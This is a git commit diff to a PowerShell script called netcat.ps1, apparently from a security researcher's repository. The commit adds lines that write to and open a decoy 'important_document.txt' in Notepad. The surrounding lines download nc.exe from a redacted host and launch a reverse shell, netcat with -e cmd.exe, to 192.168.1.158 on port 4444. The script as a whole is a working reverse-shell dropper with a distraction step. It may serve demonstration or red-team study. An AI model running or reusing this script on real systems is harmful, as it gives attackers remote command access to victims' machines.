158a7fd81de4f3df1e36ecbf69bfdb46be597523
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-04-24 14:16:51 +0100

    Update netcat.ps1

--- netcat.ps1
+++ netcat.ps1
@@ -1,3 +1,5 @@
+echo "hi" >> "C:\temp\important_document.txt"
+notepad.exe "C:\temp\important_document.txt"
 (New-Object net.webclient).DownloadFile("https://XXXXXXXXXXXXXXXXX/nc.exe", "C:\seclogs\nc.exe")
 Start-Sleep -Seconds 5
 nc.exe 192.168.1.158 4444 -e cmd.exe
